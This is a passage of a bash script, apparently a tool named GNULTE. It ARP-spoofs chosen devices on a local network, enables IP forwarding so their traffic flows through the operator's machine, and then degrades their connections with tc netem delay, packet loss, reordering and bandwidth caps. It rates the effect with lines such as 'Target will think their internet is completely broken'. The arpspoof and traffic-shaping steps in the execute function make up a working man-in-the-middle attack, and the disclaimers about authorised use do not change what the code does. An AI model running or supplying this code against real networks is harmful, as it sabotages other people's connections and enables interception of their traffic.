# -----------------------------------------------------------------------------
# SELECT TARGETS
# -----------------------------------------------------------------------------
select_targets() {
    while true; do
        echo -e "${COLOR_DIM}Enter device numbers (comma-separated, e.g., 1,2,3) or 'r' for all:${COLOR_RESET}"
        read -p "Selection: " SELECTION

        if [[ "$SELECTION" == "0" ]]; then
            log_info "Exiting."
            exit 0
        fi

        if [[ "$SELECTION" == "r" ]] || [[ "$SELECTION" == "R" ]]; then
            for i in "${!IP_LIST[@]}"; do
                TARGETS+=("${IP_LIST[$i]}")
            done
            log_target "Selected ALL ${#TARGETS[@]} devices"
            break
        fi

        IFS=',' read -ra SELECTIONS <<< "$SELECTION"
        VALID=true
        for SEL in "${SELECTIONS[@]}"; do
            if [[ "$SEL" =~ ^[0-9]+$ ]] && [ "$SEL" -ge 1 ] && [ "$SEL" -le "${#IP_LIST[@]}" ]; then
                INDEX=$((SEL-1))
                TARGETS+=("${IP_LIST[$INDEX]}")
            else
                VALID=false
                log_warn "Invalid selection: $SEL"
                break
            fi
        done

        if [ "$VALID" = true ] && [ ${#TARGETS[@]} -gt 0 ]; then
            echo ""
            log_target "Selected ${#TARGETS[@]} device(s):"
            for T in "${TARGETS[@]}"; do
                echo "    - $T"
            done
            break
        else
            TARGETS=()
            log_warn "Invalid selection. Try again."
        fi
    done
    echo ""
}

# -----------------------------------------------------------------------------
# IMPACT ESTIMATION
# -----------------------------------------------------------------------------
estimate_impact() {
    local latency=$1
    local jitter=$2
    local loss=$3
    local duplicate=$4
    local reorder=$5
    local bandwidth=$6

    echo ""
    echo -e "${COLOR_BOLD}${COLOR_INFO}Impact Estimate:${COLOR_RESET}"
    echo ""

    if [ "$latency" -le 500 ]; then
        impact_latency="Low (noticeable delay)"
        status_latency="${COLOR_OK}●${COLOR_RESET}"
    elif [ "$latency" -le 1500 ]; then
        impact_latency="Medium (annoying lag)"
        status_latency="${COLOR_WARN}●${COLOR_RESET}"
    elif [ "$latency" -le 3000 ]; then
        impact_latency="High (unusable for real-time)"
        status_latency="${COLOR_WARN}●${COLOR_RESET}"
    else
        impact_latency="Extreme (total breakdown)"
        status_latency="${COLOR_ERR}●${COLOR_RESET}"
    fi

    if [ "$jitter" -le 100 ]; then
        impact_jitter="Low (stable)"
        status_jitter="${COLOR_OK}●${COLOR_RESET}"
    elif [ "$jitter" -le 300 ]; then
        impact_jitter="Medium (noticeable variation)"
        status_jitter="${COLOR_WARN}●${COLOR_RESET}"
    elif [ "$jitter" -le 800 ]; then
        impact_jitter="High (unstable connection)"
        status_jitter="${COLOR_WARN}●${COLOR_RESET}"
    else
        impact_jitter="Extreme (chaotic)"
        status_jitter="${COLOR_ERR}●${COLOR_RESET}"
    fi

    if [ "$loss" -le 1 ]; then
        impact_loss="Low (retransmissions)"
        status_loss="${COLOR_OK}●${COLOR_RESET}"
    elif [ "$loss" -le 5 ]; then
        impact_loss="Medium (noticeable drops)"
        status_loss="${COLOR_WARN}●${COLOR_RESET}"
    elif [ "$loss" -le 15 ]; then
        impact_loss="High (frequent disconnects)"
        status_loss="${COLOR_WARN}●${COLOR_RESET}"
    else
        impact_loss="Extreme (nearly offline)"
        status_loss="${COLOR_ERR}●${COLOR_RESET}"
    fi

    if [ "$bandwidth" -gt 0 ]; then
        if [ "$bandwidth" -ge 2048 ]; then
            impact_bw="Low (2+ Mbps)"
            status_bw="${COLOR_OK}●${COLOR_RESET}"
        elif [ "$bandwidth" -ge 512 ]; then
            impact_bw="Medium (512+ kbps)"
            status_bw="${COLOR_WARN}●${COLOR_RESET}"
        elif [ "$bandwidth" -ge 128 ]; then
            impact_bw="High (128+ kbps)"
            status_bw="${COLOR_WARN}●${COLOR_RESET}"
        else
            impact_bw="Extreme (<128 kbps)"
            status_bw="${COLOR_ERR}●${COLOR_RESET}"
        fi
    fi

    local score=$((latency/1000 + jitter/100 + loss*2 + duplicate*2 + reorder))
    [ "$bandwidth" -gt 0 ] && [ "$bandwidth" -lt 512 ] && score=$((score + 10))
    if [ "$score" -le 5 ]; then
        overall="LOW — Target will barely notice"
        overall_color="${COLOR_OK}"
    elif [ "$score" -le 12 ]; then
        overall="MODERATE — Target will complain about slow internet"
        overall_color="${COLOR_WARN}"
    elif [ "$score" -le 25 ]; then
        overall="HIGH — Target's connection will be severely degraded"
        overall_color="${COLOR_ERR}"
    else
        overall="EXTREME — Target will think their internet is completely broken"
        overall_color="${COLOR_ERR}"
    fi

    echo "  ${COLOR_BOLD}Parameter     Value    Impact${COLOR_RESET}"
    echo "  ────────────────────────────────────────────────────────"
    echo -e "  Latency      ${latency}ms   ${status_latency} ${impact_latency}"
    echo -e "  Jitter       ${jitter}ms   ${status_jitter} ${impact_jitter}"
    echo -e "  Loss         ${loss}%     ${status_loss} ${impact_loss}"
    [ "$duplicate" -gt 0 ] && echo -e "  Duplication  ${duplicate}%   ${COLOR_WARN}●${COLOR_RESET} Extra packets (confuses TCP)"
    [ "$reorder" -gt 0 ] && echo -e "  Reordering   ${reorder}%   ${COLOR_WARN}●${COLOR_RESET} Out-of-order packets"
    [ "$bandwidth" -gt 0 ] && echo -e "  Bandwidth    ${bandwidth}kbps ${status_bw} ${impact_bw}"
    echo "  ────────────────────────────────────────────────────────"
    echo -e "  ${COLOR_BOLD}Overall:${COLOR_RESET} ${overall_color}${overall}${COLOR_RESET}"
    echo ""
}

# -----------------------------------------------------------------------------
# SANITY VALIDATION
# -----------------------------------------------------------------------------
validate_params() {
    local ok=true
    local var val

    for var in LATENCY JITTER LOSS DUPLICATE REORDER DURATION; do
        val="${!var}"
        if [ -n "$val" ] && ! [[ "$val" =~ ^[0-9]+$ ]]; then
            log_err "  $var must be a positive integer (got: '$val')"
            ok=false
        fi
    done
    if [ -n "$BANDWIDTH" ] && ! [[ "$BANDWIDTH" =~ ^[0-9]+$ ]]; then
        log_err "  BANDWIDTH must be a positive integer (got: '$BANDWIDTH')"
        ok=false
    fi

    if [ "$LATENCY" -lt 1 ] || [ "$LATENCY" -gt 60000 ]; then
        log_err "  Latency must be 1-60000 ms (got: ${LATENCY} ms)"
        ok=false
    fi

    [ "$JITTER" -gt "$LATENCY" ] && \
        log_warn "  Jitter (${JITTER}ms) exceeds latency (${LATENCY}ms) – expect chaotic timing"

    for var in LOSS DUPLICATE REORDER; do
        val="${!var}"
        if [ "$val" -gt 100 ]; then
            log_err "  $var must be 0-100% (got: ${val}%)"
            ok=false
        fi
    done

    local combined=$((LOSS + DUPLICATE + REORDER))
    if [ "$combined" -gt 100 ]; then
        log_err "  Loss+duplicate+reorder totals ${combined}% – cannot exceed 100%"
        ok=false
    elif [ "$combined" -gt 60 ]; then
        log_warn "  Combined loss/dup/reorder is ${combined}% – target will be nearly unusable"
    fi

    if [ "$BANDWIDTH" -ne 0 ] && [ "$BANDWIDTH" -lt 64 ]; then
        log_warn "  Bandwidth below 64 kbps may not apply reliably (got: ${BANDWIDTH} kbps)"
    fi

    if [ "$ok" = false ]; then
        log_err "  Correct the values above and try again."
        return 1
    fi
    return 0
}

# -----------------------------------------------------------------------------
# CONFIGURE PARAMETERS
# -----------------------------------------------------------------------------
configure_params() {
    echo ""
    echo -e "${COLOR_BOLD}${COLOR_INFO}Parameter Configuration:${COLOR_RESET}"
    echo -e "${COLOR_DIM}Press Enter to keep current/default values.${COLOR_RESET}"
    echo ""

    show_profiles
    read -p "Profile (or 'manual'): " PROFILE_INPUT

    if [ -n "$PROFILE_INPUT" ] && [ "$PROFILE_INPUT" != "manual" ]; then
        if load_profile "$PROFILE_INPUT"; then
            echo ""
            log_info "Using profile: ${COLOR_TARGET}$PROFILE_INPUT${COLOR_RESET}"
            echo ""
        else
            log_warn "Invalid profile. Proceeding with manual configuration."
        fi
    fi

    echo -e "${COLOR_DIM}Latency: The base delay added to every packet.${COLOR_RESET}"
    echo -e "${COLOR_DIM}  - 500ms: Noticeable delay | 2000ms: Significant lag | 5000ms: Total breakdown${COLOR_RESET}"
    read -p "Latency (ms) [${LATENCY:-$DEFAULT_LATENCY}]: " LATENCY_INPUT
    [ -n "$LATENCY_INPUT" ] && LATENCY="$LATENCY_INPUT"
    LATENCY=${LATENCY:-$DEFAULT_LATENCY}

    echo ""
    echo -e "${COLOR_DIM}Jitter: Random variation in delay.${COLOR_RESET}"
    echo -e "${COLOR_DIM}  - 100ms: Stable | 500ms: Video stuttering | 1000ms: Chaotic${COLOR_RESET}"
    read -p "Jitter (ms) [${JITTER:-$DEFAULT_JITTER}]: " JITTER_INPUT
    [ -n "$JITTER_INPUT" ] && JITTER="$JITTER_INPUT"
    JITTER=${JITTER:-$DEFAULT_JITTER}

    echo ""
    echo -e "${COLOR_DIM}Loss: Percentage of packets dropped.${COLOR_RESET}"
    echo -e "${COLOR_DIM}  - 1-2%: Retransmissions | 5-10%: Disconnects | 15%+: Nearly offline${COLOR_RESET}"
    read -p "Loss (%) [${LOSS:-$DEFAULT_LOSS}]: " LOSS_INPUT
    [ -n "$LOSS_INPUT" ] && LOSS="$LOSS_INPUT"
    LOSS=${LOSS:-$DEFAULT_LOSS}

    echo ""
    echo -e "${COLOR_DIM}Duplicate: Duplicate packets (confuses TCP).${COLOR_RESET}"
    read -p "Duplicate (%) [${DUPLICATE:-$DEFAULT_DUPLICATE}]: " DUPLICATE_INPUT
    [ -n "$DUPLICATE_INPUT" ] && DUPLICATE="$DUPLICATE_INPUT"
    DUPLICATE=${DUPLICATE:-$DEFAULT_DUPLICATE}

    echo ""
    echo -e "${COLOR_DIM}Reorder: Out-of-order packets (breaks TCP flow).${COLOR_RESET}"
    read -p "Reorder (%) [${REORDER:-$DEFAULT_REORDER}]: " REORDER_INPUT
    [ -n "$REORDER_INPUT" ] && REORDER="$REORDER_INPUT"
    REORDER=${REORDER:-$DEFAULT_REORDER}

    echo ""
    echo -e "${COLOR_DIM}Bandwidth: Limit download/upload speed in kbps (0 = unlimited).${COLOR_RESET}"
    echo -e "${COLOR_DIM}  - 2048: 2 Mbps | 512: 512 kbps | 128: 128 kbps | 64: 64 kbps${COLOR_RESET}"
    read -p "Bandwidth (kbps) [${BANDWIDTH:-$DEFAULT_BANDWIDTH}]: " BW_INPUT
    [ -n "$BW_INPUT" ] && BANDWIDTH="$BW_INPUT"
    BANDWIDTH=${BANDWIDTH:-$DEFAULT_BANDWIDTH}

    if [ "$DURATION" -eq 0 ]; then
        echo ""
        echo -e "${COLOR_DIM}Duration: Auto-stop after N seconds (0 = unlimited).${COLOR_RESET}"
        read -p "Duration (seconds) [unlimited]: " DURATION_INPUT
        DURATION=${DURATION_INPUT:-0}
    fi

    echo ""
    log_info "Configuration:"
    log_info "  Targets  : ${#TARGETS[@]} device(s)"
    log_info "  Latency  : ${LATENCY}ms"
    log_info "  Jitter   : ${JITTER}ms"
    log_info "  Loss     : ${LOSS}%"
    log_info "  Dup      : ${DUPLICATE}%"
    log_info "  Reorder  : ${REORDER}%"
    [ "$BANDWIDTH" -gt 0 ] && log_info "  Bandwidth: ${BANDWIDTH} kbps"
    [ "$DURATION" -gt 0 ] && log_info "  Duration : ${DURATION}s"
    [ "$RANDOM_MODE" = true ] && log_info "  Mode     : ${COLOR_WARN}RANDOM${COLOR_RESET}"
    echo ""

    if ! validate_params; then
        echo ""
        read -p "Re-enter parameters? (y/n) [y]: " RETRY
        case "${RETRY:-y}" in
            n|N) log_info "Aborted."; exit 1 ;;
            *)   configure_params; return ;;
        esac
    fi

    estimate_impact "$LATENCY" "$JITTER" "$LOSS" "$DUPLICATE" "$REORDER" "$BANDWIDTH"

    read -p "Save these settings as a profile? (y/n): " SAVE_PROF
    if [[ "$SAVE_PROF" =~ ^[Yy]$ ]]; then
        read -p "Profile name: " PROF_NAME
        save_profile "$PROF_NAME"
    fi

    read -p "Start? (y/n): " CONFIRM
    if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
        log_info "Aborted."
        exit 0
    fi
}

# -----------------------------------------------------------------------------
# EXECUTE
# -----------------------------------------------------------------------------
execute() {
    log_section "EXECUTING"

    if ! expert_confirm "Enable IP forwarding (route the target's traffic through this computer)" \
        "sudo sysctl -w net.ipv4.ip_forward=1"; then
        log_warn "Skipped by user."
    fi
    say "Step 1 — turning on routing so the chosen device's data flows through this computer…"
    log_cmd "sysctl -w net.ipv4.ip_forward=1"
    sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
    log_ok "IP forwarding enabled"

    if ! command -v arpspoof &>/dev/null; then
        log_err "arpspoof not found. Install with: sudo apt install dsniff"
        exit 1
    fi

    say "Step 2 — making each target device believe this computer is its router…"
    if ! expert_confirm "Start ARP spoofing (redirect each target's traffic to this computer)" \
        "sudo arpspoof -i $INTERFACE -t <TARGET> $GATEWAY"; then
        log_warn "Skipped spoofing by user."
    fi
    for TARGET_IP in "${TARGETS[@]}"; do
        log_info "Starting attack on $TARGET_IP..."

        log_cmd "arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY"
        sudo arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" 2>/dev/null &
        SPOOF1_PIDS+=($!)
        log_ok "Spoof $TARGET_IP -> $GATEWAY (PID ${SPOOF1_PIDS[-1]})"

        log_cmd "arpspoof -i $INTERFACE -t $GATEWAY $TARGET_IP"
        sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" 2>/dev/null &
        SPOOF2_PIDS+=($!)
        log_ok "Spoof $GATEWAY -> $TARGET_IP (PID ${SPOOF2_PIDS[-1]})"
    done

    echo ""
    flash "Waiting for ARP tables to update..."
    sleep 2

    log_info "Applying traffic control..."
    sudo tc qdisc del dev "$INTERFACE" root 2>/dev/null

    # Build the netem parameters
    NETEM="delay ${LATENCY}ms ${JITTER}ms"
    [ "$LOSS" -gt 0 ] && NETEM="$NETEM loss ${LOSS}%"
    [ "$DUPLICATE" -gt 0 ] && NETEM="$NETEM duplicate ${DUPLICATE}%"
    [ "$REORDER" -gt 0 ] && NETEM="$NETEM reorder ${REORDER}% gap 5"

    say "Step 3 — slowing the target's link to: ${LATENCY}ms delay${LOSS:+ / ${LOSS}% loss}${JITTER:+ (jitter ${JITTER}ms)}${BANDWIDTH:+ / ${BANDWIDTH} kbps cap}…"
    if ! expert_confirm "Apply traffic shaping to ${TARGETS[*]}" \
        "sudo tc qdisc add dev $INTERFACE root netem ${NETEM:-delay ${LATENCY}ms ${JITTER}ms}"; then
        log_warn "Skipped traffic control by user."
    fi

    # Bandwidth throttling (if enabled) – chain netem UNDER htb so nothing is lost
    if [ "$BANDWIDTH" -gt 0 ]; then
        log_info "Chaining netem under htb (${BANDWIDTH} kbps)..."
        log_cmd "tc qdisc add dev $INTERFACE root handle 1: htb default 10"
        log_cmd "tc class add dev $INTERFACE parent 1: classid 1:10 htb rate ${BANDWIDTH}kbit"
        log_cmd "tc qdisc add dev $INTERFACE parent 1:10 handle 10: netem $NETEM"
        log_cmd "tc qdisc add dev $INTERFACE parent 10: handle 30: tbf rate ${BANDWIDTH}kbit burst 32kbit latency 400ms"

        ( sudo tc qdisc add dev "$INTERFACE" root handle 1: htb default 10 \
              && sudo tc class add dev "$INTERFACE" parent 1: classid 1:10 htb rate "${BANDWIDTH}kbit" \
              && sudo tc qdisc add dev "$INTERFACE" parent 1:10 handle 10: netem $NETEM \
              && sudo tc qdisc add dev "$INTERFACE" parent 10: handle 30: tbf rate "${BANDWIDTH}kbit" burst 32kbit latency 400ms 2>/dev/null ) &
        local tc_pid=$!
        spinner "$tc_pid" "Applying traffic shaping (netem + bandwidth)..."
        wait "$tc_pid"
        if [ $? -eq 0 ]; then
            log_ok "Traffic shaped: ${BANDWIDTH} kbps with netem"
        else
            log_err "Failed to apply traffic control"
            cleanup
            exit 1
        fi
    else
        log_cmd "tc qdisc add dev $INTERFACE root netem $NETEM"
        ( sudo tc qdisc add dev "$INTERFACE" root netem $NETEM 2>/dev/null ) &
        local tc_pid=$!
        spinner "$tc_pid" "Applying traffic control..."
        wait "$tc_pid"
        if [ $? -eq 0 ]; then
            log_ok "Traffic control applied to ALL targets"
        else
            log_err "Failed to apply traffic control"
            cleanup
            exit 1
        fi
    fi
    echo ""
}

# -----------------------------------------------------------------------------
# MULTI-TERMINAL MONITOR (spawns a terminal per target)
# -----------------------------------------------------------------------------
spawn_monitor_terminal() {
    local ip="$1"
    local lat="$2"
    local jit="$3"
    local loss="$4"
    local bw="$5"

    local cmd="echo 'GNULTE Monitor – Target: $ip'; echo 'Latency: ${lat}ms | Jitter: ${jit}ms | Loss: ${loss}%'; [ $bw -gt 0 ] && echo 'Bandwidth: ${bw} kbps'; echo '────────────────────────────────────────'; while true; do P=\$(ping -c 1 -W 1 $ip 2>/dev/null | grep 'time=' | awk -F'time=' '{print \$2}' | cut -d' ' -f1); if [ -n \"\$P\" ]; then MS=\$(printf '%.0f' \"\$P\"); echo \"[\$(date +%H:%M:%S)] \${MS}ms\"; else echo \"[\$(date +%H:%M:%S)] unreachable\"; fi; sleep 1; done"

    # Try different terminals
    if command -v gnome-terminal &>/dev/null; then
        gnome-terminal --title="GNULTE – $ip" -- bash -c "$cmd" &
        TERMINAL_PIDS+=($!)
    elif command -v konsole &>/dev/null; then
        konsole --title "GNULTE – $ip" -e bash -c "$cmd" &
        TERMINAL_PIDS+=($!)
    elif command -v xterm &>/dev/null; then
        xterm -title "GNULTE – $ip" -e bash -c "$cmd" &
        TERMINAL_PIDS+=($!)
    elif command -v xfce4-terminal &>/dev/null; then
        xfce4-terminal --title="GNULTE – $ip" -e "bash -c \"$cmd\"" &
        TERMINAL_PIDS+=($!)
    elif command -v alacritty &>/dev/null; then
        alacritty --title "GNULTE – $ip" -e bash -c "$cmd" &
        TERMINAL_PIDS+=($!)
    elif command -v kitty &>/dev/null; then
        kitty --title "GNULTE – $ip" bash -c "$cmd" &
        TERMINAL_PIDS+=($!)
    else
        # Fallback: use tmux if available
        if command -v tmux &>/dev/null; then
            tmux new-window -n "GNULTE-$ip" "bash -c \"$cmd\""
        else
            log_warn "No terminal emulator found. Falling back to single monitor."
            return 1
        fi
    fi
    return 0
}

# -----------------------------------------------------------------------------
# LIVE DASHBOARD
# -----------------------------------------------------------------------------
DASH_LINES=0

dash_clear() {
    if [ "$DASH_LINES" -gt 0 ]; then
        printf "\033[${DASH_LINES}A\033[J"
    fi
    DASH_LINES=0
}

dash_emit() {
    printf "  %s\n" "$1"
    DASH_LINES=$((DASH_LINES + 1))
}

spark_char() {
    local v=$1
    if   [ "$v" -lt 0 ];    then printf "x"
    elif [ "$v" -le 80 ];   then printf "."
    elif [ "$v" -le 250 ];  then printf "-"
    elif [ "$v" -le 500 ];  then printf "="
    elif [ "$v" -le 1000 ]; then printf "#"
    else                          printf "█"; fi
}

status_dot() {
    local v=$1
    if   [ "$v" -lt 0 ];   then printf "${COLOR_ERR}●${COLOR_RESET}"
    elif [ "$v" -le 300 ]; then printf "${COLOR_OK}●${COLOR_RESET}"
    elif [ "$v" -le 800 ]; then printf "${COLOR_WARN}●${COLOR_RESET}"
    else                         printf "${COLOR_ERR}●${COLOR_RESET}"; fi
}

render_single_dashboard() {
    local ip="${TARGETS[0]}"
    local last="${STAT_LAST[0]}" cnt="${STAT_COUNT[0]}" total="${STAT_TOTAL[0]}"
    local mn="${STAT_MIN[0]}" mx="${STAT_MAX[0]}" drops="${STAT_DROP[0]}"
    local avg=0 loss="0.0" attempts=$((cnt + drops))
    [ "$cnt" -gt 0 ] && avg=$((total / cnt))
    [ "$attempts" -gt 0 ] && loss=$(awk -v d="$drops" -v a="$attempts" 'BEGIN{printf "%.1f", d*100/a}')

    local mn_s="--" mx_s="--" last_str="--"
    [ "$cnt" -gt 0 ] && mn_s="${mn}ms" && mx_s="${mx}ms"
    [ "$last" -ge 0 ] && last_str="${last}ms"
    local state="${COLOR_OK}STABLE${COLOR_RESET}"
    if   [ "$last" -lt 0 ];   then state="${COLOR_ERR}UNREACHABLE${COLOR_RESET}"
    elif [ "$last" -gt 800 ]; then state="${COLOR_ERR}SEVERE${COLOR_RESET}"
    elif [ "$last" -gt 300 ]; then state="${COLOR_WARN}DEGRADED${COLOR_RESET}"; fi

    dash_emit ""
    dash_emit "${COLOR_BOLD}Target: ${COLOR_TARGET}${ip}${COLOR_RESET}    Status: ${state}    Last: ${COLOR_BOLD}${last_str}${COLOR_RESET}"
    dash_emit "${COLOR_DIM}min: ${mn_s}   max: ${mx_s}   avg: ${avg}ms   samples: ${cnt}   loss: ${loss}%${COLOR_RESET}"

    local sp="" start=0 n=${#SPARK_SAMPLES[@]}
    [ "$n" -gt 40 ] && start=$((n - 40))
    for ((k=start; k<n; k++)); do
        sp+="$(spark_char "${SPARK_SAMPLES[$k]}")"
    done
    [ -z "$sp" ] && sp="(awaiting samples...)"
    dash_emit "${COLOR_ANIM}${sp}${COLOR_RESET}"
    dash_emit "${COLOR_DIM}${COLOR_BOLD}[$(date +%H:%M:%S)]${COLOR_RESET}"
}

render_multi_dashboard() {
    dash_emit ""
    dash_emit "${COLOR_BOLD}#   Status   Target            min      max     avg    loss   last${COLOR_RESET}"
    dash_emit "${COLOR_DIM}──────────────────────────────────────────────────────────────────────────${COLOR_RESET}"

    local i ip cnt total mn mx drops last avg attempts loss dot mn_s mx_s last_s
    for i in "${!TARGETS[@]}"; do
        ip="${TARGETS[$i]}"; cnt="${STAT_COUNT[$i]}"; total="${STAT_TOTAL[$i]}"
        mn="${STAT_MIN[$i]}"; mx="${STAT_MAX[$i]}"; drops="${STAT_DROP[$i]}"; last="${STAT_LAST[$i]}"
        avg=0; attempts=$((cnt + drops))
        [ "$cnt" -gt 0 ] && avg=$((total / cnt))
        loss="0.0"; [ "$attempts" -gt 0 ] && loss=$(awk -v d="$drops" -v a="$attempts" 'BEGIN{printf "%.1f", d*100/a}')
        dot=$(status_dot "$last")
        mn_s="--"; mx_s="--"; last_s="--"
        [ "$cnt" -gt 0 ] && mn_s="${mn}ms" && mx_s="${mx}ms"
        [ "$last" -ge 0 ] && last_s="${last}ms"

        printf "  %-3s %s   ${COLOR_TARGET}%-16s${COLOR_RESET} %6s %7s %7s %5s%% %7s\n" \
            "$((i+1))" "$dot" "$ip" "$mn_s" "$mx_s" "${avg}ms" "$loss" "$last_s"
        DASH_LINES=$((DASH_LINES + 1))
    done
    dash_emit ""
}

# -----------------------------------------------------------------------------
# POST-TEST REPORT
# -----------------------------------------------------------------------------
report_fname() {
    echo "$REPORT_SAMPLE_DIR/$(echo "$1" | tr './:' '_').txt"
}

ascii_chart_for() {
    local file=$1 label=$2
    local -a vals=()
    local v
    while IFS= read -r v; do vals+=("$v"); done < "$file"
    local n=${#vals[@]}
    [ "$n" -gt 0 ] || { echo "  (no samples recorded)"; return; }
    echo "  Latency over time – $label"

    local mx=0
    for v in "${vals[@]}"; do [ "$v" -gt "$mx" ] && mx=$v; done

    local cols=60 B=$n
    [ "$B" -gt "$cols" ] && B=$cols
    local step=$(( (n + B - 1) / B ))
    [ "$step" -lt 1 ] && step=1
    local -a buckets=() down=()
    local idx bstart bend sum_c bval down_b k
    for ((idx=0; idx<B; idx++)); do
        bstart=$((idx * step)); bend=$((bstart + step))
        [ "$bend" -gt "$n" ] && bend=$n
        sum_c=0; down_b=0
        for ((k=bstart; k<bend; k++)); do
            v="${vals[$k]}"
            if [ "$v" -lt 0 ]; then down_b=1; v=0; fi
            sum_c=$((sum_c + v))
        done
        bval=$((sum_c / (bend - bstart)))
        [ "$bval" -lt 1 ] && bval="$down_b"
        buckets[$idx]=$bval
        down[$idx]=$down_b
    done

    local gmax=$(( (mx + 99) / 100 * 100 ))
    [ "$gmax" -lt 100 ] && gmax=100
    local row yval ch bval2
    for ((row=5; row>=0; row--)); do
        yval=$((gmax * row / 5))
        if [ "$row" -eq 0 ]; then
            printf " %6d +" 0
            for ((idx=0; idx<B; idx++)); do printf "─"; done
            echo ""
        else
            printf " %6d │" "$yval"
            for ((idx=0; idx<B; idx++)); do
                bval2="${buckets[$idx]}"
                if [ "${down[$idx]}" -eq 1 ]; then ch="x"
                elif [ "$bval2" -ge "$yval" ]; then ch="█"
                elif [ "$bval2" -ge "$((yval * 3 / 4))" ]; then ch="▄"
                elif [ "$bval2" -ge "$((yval / 2))" ]; then ch="·"
                else ch=" "; fi
                printf "%s" "$ch"
            done
            echo ""
        fi
    done
    printf "           %s\n" "$label"
}

svg_chart_for() {
    local file=$1 label=$2 html=$3
    local -a vals=()
    local v
    while IFS= read -r v; do vals+=("$v"); done < "$file"
    local n=${#vals[@]}
    [ "$n" -gt 0 ] || return

    local mx=0
    for v in "${vals[@]}"; do [ "$v" -gt "$mx" ] && mx=$v; done
    [ "$mx" -lt 1 ] && mx=1

    local W=$((n * 4 + 60))
    [ "$W" -gt 900 ] && W=900
    [ "$W" -lt 220 ] && W=220
    local H=150 pad=25
    local span=$((H - pad - pad))
    [ "$span" -lt 1 ] && span=1

    {
        echo "<h2>Latency: $label</h2>"
        echo "<svg width=\"$W\" height=\"$H\" viewBox=\"0 0 $W $H\">"
        echo "<rect width=\"$W\" height=\"$H\" fill=\"#0d1117\"/>"
        echo "<line x1=\"$pad\" y1=\"$((H - pad))\" x2=\"$((W - 10))\" y2=\"$((H - pad))\" stroke=\"#30363d\"/>"
    } >> "$html"

    local pts="" idx x y cnt=0
    for ((idx=0; idx<n; idx++)); do
        v="${vals[$idx]}"
        x=$((pad + idx * 4))
        if [ "$v" -lt 0 ]; then
            echo "<circle cx=\"$x\" cy=\"$((H - pad))\" r=\"1.8\" fill=\"#f85149\"/>" >> "$html"
            continue
        fi
        y=$((pad + span - (v * span) / mx))
        pts="${pts}${x},${y} "
        cnt=$((cnt + 1))
    done
    [ "$cnt" -gt 1 ] && echo "<polyline points=\"$pts\" fill=\"none\" stroke=\"#39d1c4\" stroke-width=\"1.3\"/>" >> "$html"
    echo "</svg>" >> "$html"
}

generate_report() {
    if [ -z "$REPORT_SAMPLE_DIR" ] || [ ! -d "$REPORT_SAMPLE_DIR" ]; then
        return 0
    fi

    local outdir="gnulte-report-$(date +%Y%m%d-%H%M%S)"
    mkdir -p "$outdir" 2>/dev/null || return 0
    local txt="$outdir/report.txt"
    local html="$outdir/report.html"

    {
        echo "GNULTE v8.0 – Post-Test Report"
        echo "==============================="
        echo "Generated : $(date)"
        echo "Interface : $INTERFACE"
        echo "Gateway   : $GATEWAY"
        echo "Duration  : ${DURATION}s${RANDOM_MODE:+ (random mode active)}"
        [ "$BANDWIDTH" -gt 0 ] && echo "Bandwidth : ${BANDWIDTH} kbps"
        echo "Params    : latency ${LATENCY}ms | jitter ${JITTER}ms | loss ${LOSS}% | dup ${DUPLICATE}% | reorder ${REORDER}%"
        echo "Targets   : ${#TARGETS[@]} (${TARGETS[*]})"
        echo "Purpose   : Authorised network testing on owned/consented networks only"
        echo ""
    } > "$txt"

    cat > "$html" << 'EOF'
<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8"><title>GNULTE Report</title>
<style>body{font-family:ui-monospace,Consolas,monospace;background:#0d1117;color:#c9d1d9;margin:2rem;max-width:900px}
h1{color:#39d1c4}h2{color:#58a6ff;border-bottom:1px solid #30363d;padding-bottom:.3rem;margin-top:1.8rem}
table{border-collapse:collapse;margin:1rem 0}td,th{border:1px solid #30363d;padding:.3rem .7rem;text-align:left}
th{color:#58a6ff}.p{color:#8b949e}</style></head>
<body><h1>GNULTE Report</h1>
<p class="p">Authorised network testing only. See application disclaimer.</p>
EOF

    echo "<h2>Summary</h2><table><tr><th>Target</th><th>Samples</th><th>Ok</th><th>Down</th><th>min</th><th>max</th><th>avg</th><th>loss %</th></tr>" >> "$html"

    local T file n cnt mn mx sum drops v avg loss att
    for T in "${TARGETS[@]}"; do
        file="$(report_fname "$T")"
        [ -f "$file" ] || continue

        n=$(wc -l < "$file")
        cnt=0; mn=999999; mx=0; sum=0; drops=0; v=0
        while IFS= read -r v; do
            if [ "$v" -lt 0 ]; then drops=$((drops + 1)); continue; fi
            cnt=$((cnt + 1)); sum=$((sum + v))
            [ "$v" -lt "$mn" ] && mn=$v
            [ "$v" -gt "$mx" ] && mx=$v
        done < "$file"
        avg=0; [ "$cnt" -gt 0 ] && avg=$((sum / cnt))
        loss="0.0"; att=$((cnt + drops)); [ "$att" -gt 0 ] && loss=$(awk -v d="$drops" -v a="$att" 'BEGIN{printf "%.1f", d*100/a}')
        [ "$cnt" -gt 0 ] || mn=0

        {
            echo ""
            echo "Target: $T"
            echo "  samples: $n   ok: $cnt   down: $drops"
            echo "  min: ${mn}ms   max: ${mx}ms   avg: ${avg}ms   loss: ${loss}%"
            echo ""
            ascii_chart_for "$file" "$T"
        } >> "$txt"

        echo "<tr><td>$T</td><td>$n</td><td>$cnt</td><td>$drops</td><td>${mn}ms</td><td>${mx}ms</td><td>${avg}ms</td><td>${loss}%</td></tr>" >> "$html"
        svg_chart_for "$file" "$T" "$html"
    done

    echo "</table>" >> "$html"
    echo "<p class='p'>Generated by GNULTE v8.0. Keep within authorised use.</p></body></html>" >> "$html"

    if [ -n "$EXPORT_CSV" ] && [ -f "$EXPORT_CSV" ]; then
        cp "$EXPORT_CSV" "$outdir/" 2>/dev/null
        echo "" >> "$txt"
        echo "CSV export copied into report directory." >> "$txt"
    fi

    if [ -d "$REPORT_SAMPLE_DIR" ]; then
        cp -r "$REPORT_SAMPLE_DIR" "$outdir/samples" 2>/dev/null
        echo "" >> "$txt"
        echo "Raw per-second samples stored in: samples/" >> "$txt"
    fi
    rm -rf "$REPORT_SAMPLE_DIR"
    REPORT_SAMPLE_DIR=""

    log_ok "Report saved to: ${COLOR_TARGET}$outdir/${COLOR_RESET} (txt + html + graphs)"
}

# -----------------------------------------------------------------------------
# MONITOR
# -----------------------------------------------------------------------------
monitor() {
    log_section "MONITORING"
